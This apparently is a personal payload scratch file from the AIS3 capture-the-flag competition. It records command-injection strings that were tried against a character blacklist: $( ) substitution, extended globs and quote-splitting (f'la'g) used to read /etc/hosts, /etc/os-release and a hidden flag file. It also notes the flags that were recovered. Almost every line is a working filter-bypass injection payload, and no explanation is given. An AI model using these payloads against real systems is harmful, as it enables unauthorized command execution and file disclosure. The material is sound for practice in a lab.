# $blacklist = ['|', '&', ';', '>', '<', "\n", 'flag', '*', '?'];

echo $( echo $( cat fla+([0-9a-zA-Z_]) ) )

$( echo $( cat fla+([0-9a-zA-Z_]) ) ).com 10.105.2.157

$(cat /fla+([0-9a-zA-Z_])).com

$(echo abc).com 10.105.2.157

$(head -c 3 /etc/hosts).com 10.105.2.157

google.com/$(head -c 5 /etc/hosts) 10.105.2.157

a/$(head -c 21 /etc/os-release) 10.105.2.157

a/$(head -c 21 /fla+([a-zA-Z0-9_])) 10.105.2.157

a/"$(echo AIS3{JUST_@_e45y_INT_OVeRflow_4nD_Buf_oveRFLOW})" 10.105.2.157

$(cat /+([0-9a-zA-Z_])+([0-9a-zA-Z_])+([0-9a-zA-Z_])+([0-9a-zA-Z_])+([0-9a-zA-Z_])+([0-9a-zA-Z_])+([0-9a-zA-Z_]))

a/"$(cat /+([0-9a-zA-Z_])+([0-9a-zA-Z_])+([0-9a-zA-Z_])+([0-9a-zA-Z_])+([0-9a-zA-Z_])+([0-9a-zA-Z_])+([0-9a-zA-Z_]))" 10.105.2.157

a/$(ls /)

a/$(find / -maxdepth 1 -size -64 -not -type d) 10.105.2.157

# c/$(find / -maxdepth 1 -size +0 -size -16 -type f) 10.105.2.157

c/$(find / -maxdepth 1 -size +0 -size -16 -type f -printf '%p::') 10.105.2.157
# /flag_aacaEAFZnU6JEnFj

c/$(cat /f'la'g_aacaEAFZnU6JEnFj) 10.105.2.157
# c/$(cat /f'la'g+([0-9a-zA-Z_])) 10.105.2.157
# AIS3{jU$T_3asY_coMM@Nd_INj3c7I0N}

# Merge
$(cat $(find / -maxdepth 1 -size +0 -type f -printf '%p')) 10.105.2.157
